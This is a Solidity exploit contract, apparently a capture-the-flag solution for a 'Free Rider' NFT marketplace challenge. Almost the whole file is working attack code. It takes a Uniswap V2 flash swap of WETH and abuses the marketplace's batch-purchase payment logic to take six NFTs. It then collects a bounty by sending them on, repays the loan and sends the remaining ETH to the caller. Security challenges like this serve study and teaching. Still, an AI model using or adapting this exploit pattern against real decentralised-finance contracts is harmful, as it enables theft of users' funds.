// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './FreeRiderBuyer.sol';
import './FreeRiderNFTMarketplace.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IWETH.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "hardhat/console.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver{
    IUniswapV2Pair private pair;
    FreeRiderBuyer private buyer;
    FreeRiderNFTMarketplace private marketplace;
    IERC721 private nft;
    IWETH private weth;
    uint256 private payout = 45 ether;
    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(address pairAddr, 
                address buyerAddr, 
                address payable marketplaceAddr, 
                address nftAddr,
                address wethAddr) {
        pair = IUniswapV2Pair(pairAddr);
        buyer = FreeRiderBuyer(buyerAddr);
        marketplace = FreeRiderNFTMarketplace(marketplaceAddr);
        nft = IERC721(nftAddr);
        weth = IWETH(wethAddr);
    }

    function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata) external override {
        require(msg.sender == address(pair), "Can only be called by Uniswap Pair");
        address token0 = pair.token0();
        uint256 amountWETH;
        amountWETH = token0 == address(weth) ? amount0 : amount1;
        require(amountWETH != uint256(0), "Not flashloan WETH");
        weth.withdraw(amountWETH);
        marketplace.buyMany{value : 15 ether}(tokenIds);
        for(uint i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(buyer), tokenIds[i], abi.encode(0));
        }
        uint256 repayAmount = (amountWETH * 1000) / 997 +1;
        weth.deposit{value : repayAmount}();
        bool success = weth.transfer(address(pair), repayAmount);
        require(success, "failed to return flash loan");
    }

    function attack() external {
        address token0 = pair.token0();
        uint256 amount0;
        uint256 amount1;
        if(token0 == address(weth)) {
            amount0 = 15 ether;
        }else {
            amount1 = 15 ether;
        }
        pair.swap(amount0, amount1, address(this), abi.encode(0));
        (bool success, ) = msg.sender.call{ value : address(this).balance}("");
        require(success, "Failed to transfer the fund");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns(bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() payable external {
        
    }
}   